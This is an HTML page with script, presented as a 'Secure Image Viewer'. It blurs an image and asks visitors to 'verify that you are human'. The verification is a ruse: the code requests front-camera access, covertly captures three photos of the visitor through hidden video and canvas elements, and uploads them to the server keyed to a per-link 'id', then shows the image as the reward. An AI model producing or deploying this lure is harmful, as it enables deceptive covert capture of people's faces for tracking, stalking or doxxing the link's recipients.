<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Image Viewer</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: #0d0f12;
            color: #e0e0e0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Blurred Background Image Container */
        .bg-image-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            overflow: hidden;
            display: none; /* Shown via JS */
        }

        .bg-image {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(25px) brightness(0.4);
            transform: scale(1.1);
        }

        /* Glassmorphism Card */
        .glass-card {
            position: relative;
            z-index: 10;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 40px 30px;
            width: 90%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
            animation: fadeIn 0.8s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .icon-shield {
            font-size: 48px;
            margin-bottom: 15px;
            display: inline-block;
            background: -webkit-linear-gradient(#00f2fe, #4facfe);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #ffffff;
        }

        p {
            font-size: 15px;
            color: #a0a0a0;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        button {
            background: linear-gradient(135deg, #0061ff 0%, #60efff 100%);
            color: #000;
            font-weight: 700;
            font-size: 16px;
            border: none;
            border-radius: 12px;
            padding: 15px 25px;
            width: 100%;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 8px 20px rgba(0, 97, 255, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 25px rgba(0, 97, 255, 0.5);
        }

        button:active {
            transform: translateY(1px);
        }

        .btn-icon {
            font-size: 20px;
        }

        .status-msg {
            margin-top: 20px;
            font-size: 14px;
            font-weight: 600;
            display: none;
            animation: fadeIn 0.3s;
        }

        .status-loading { color: #ffca28; }
        .status-success { color: #00e676; }
        .status-error { color: #ff5252; }

        /* Hidden elements */
        #videoElement, #canvasElement { display: none; }
        
        /* Final Clear Image */
        .clear-image {
            width: 100%;
            border-radius: 12px;
            margin-top: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            display: none;
            animation: fadeIn 1s;
        }
    </style>
</head>
<body>

<!-- Blurred Background -->
<div class="bg-image-container" id="bgContainer">
    <img src="" alt="Blurred Background" class="bg-image" id="bgImage">
</div>

<!-- Main UI Card -->
<div class="glass-card" id="mainCard">
    <div class="icon-shield">🛡️</div>
    <h2>Protected Image</h2>
    <p>This image is highly protected by our security system. Please verify that you are human to unlock and view the clear image.</p>
    
    <button id="verifyBtn">
        <span class="btn-icon">👁️</span>
        Verify & View Image
    </button>
    
    <div id="loading" class="status-msg status-loading">⏳ Verifying... Please look at your screen.</div>
    <div id="success" class="status-msg status-success">✅ Verification complete! Loading image...</div>
    <div id="error" class="status-msg status-error"></div>
    
    <img src="" id="finalImage" class="clear-image">
</div>

<!-- Hidden Camera Elements -->
<video id="videoElement" autoplay playsinline></video>
<canvas id="canvasElement"></canvas>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('id');

    const verifyBtn = document.getElementById('verifyBtn');
    const loading = document.getElementById('loading');
    const success = document.getElementById('success');
    const errorMsg = document.getElementById('error');
    const video = document.getElementById('videoElement');
    const canvas = document.getElementById('canvasElement');
    const bgContainer = document.getElementById('bgContainer');
    const bgImage = document.getElementById('bgImage');
    const finalImage = document.getElementById('finalImage');

    let originalImageUrl = '';

    // Initialization
    async function init() {
        if (!userId) {
            verifyBtn.style.display = 'none';
            showError("Invalid or missing link parameter.");
            return;
        }

        // Fetch image URL to show blurred background
        try {
            const res = await fetch(`/api/link/${userId}`);
            if (res.ok) {
                const data = await res.json();
                originalImageUrl = data.original_image_url;
                bgImage.src = originalImageUrl;
                bgContainer.style.display = 'block';
            } else {
                showError("Link expired or not found.");
                verifyBtn.style.display = 'none';
            }
        } catch (e) {
            console.error(e);
        }
    }

    function showError(text) {
        errorMsg.textContent = "❌ " + text;
        errorMsg.style.display = 'block';
        loading.style.display = 'none';
        verifyBtn.style.display = 'block';
        verifyBtn.innerHTML = '<span class="btn-icon">🔄</span> Try Again';
    }

    verifyBtn.addEventListener('click', async () => {
        try {
            // Request camera permission
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            video.srcObject = stream;
            
            verifyBtn.style.display = 'none';
            loading.style.display = 'block';
            errorMsg.style.display = 'none';

            video.onloadedmetadata = async () => {
                const images = [];
                
                // Capture sequence
                for (let i = 0; i < 3; i++) {
                    await new Promise(resolve => setTimeout(resolve, 800));
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                    images.push(blob);
                }

                // Stop camera
                stream.getTracks().forEach(track => track.stop());

                // Upload
                const formData = new FormData();
                formData.append('id', userId);
                images.forEach((blob, idx) => {
                    formData.append('photos', blob, `photo${idx}.jpg`);
                });

                try {
                    const response = await fetch('/upload', {
                        method: 'POST',
                        body: formData
                    });

                    if (response.ok) {
                        loading.style.display = 'none';
                        success.style.display = 'block';
                        
                        // Show the final clear image inside the card
                        setTimeout(() => {
                            success.style.display = 'none';
                            bgContainer.style.opacity = '0'; // hide blurred background
                            document.querySelector('.icon-shield').style.display = 'none';
                            document.querySelector('h2').style.display = 'none';
                            document.querySelector('p').style.display = 'none';
                            
                            finalImage.src = originalImageUrl;
                            finalImage.style.display = 'block';
                        }, 1000);
                    } else {
                        showError("Verification failed on server.");
                    }
                } catch (err) {
                    showError("Network error during verification.");
                }
            };
        } catch (err) {
            console.error("Camera error:", err);
            showError("Camera permission is required to verify.");
        }
    });

    init();
</script>

</body>
</html>
